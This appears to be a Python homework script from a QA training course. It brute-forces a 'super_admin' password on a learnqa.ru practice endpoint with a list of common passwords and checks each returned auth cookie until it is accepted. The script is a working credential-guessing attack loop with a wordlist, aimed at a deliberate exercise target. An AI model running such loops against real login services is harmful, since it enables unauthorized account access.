import requests

for i in ('123456','123456789', 'qwerty', 'password', '1234567', '12345678', '12345', 'iloveyou', '111111',
          '123123', 'abc123', 'qwerty123', '1q2w3e4r', 'admin', 'qwertyuiop', '654321', '555555', 'lovely', '7777777', 'welcome',
          '888888', 'prencess', 'dragon', 'password1', '123qwe'):
    # перебираем в цикле варианты паролей
    data = {"login": "super_admin", "password" : i}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data = data)
    print(response1.text)
    print(response1.status_code)

    # кладем полученную куку в переменную
    cookie_value = response1.cookies.get('auth_cookie')
    print(cookie_value)
    # готовим словарь с куки для отправки гет запроса
    cookies = {}
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})

    # отправляем гет запрос, чтобы узнать, успешна ли авторизация
    response2 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    print(response2.text)
    print(response2.status_code)
    # если текст ответа "Вы авторизованы", выводим на консоль правильный пароль и выходим из цикла
    if response2.text == 'You are authorized':
        print('Правильный пароль:', i)
        break

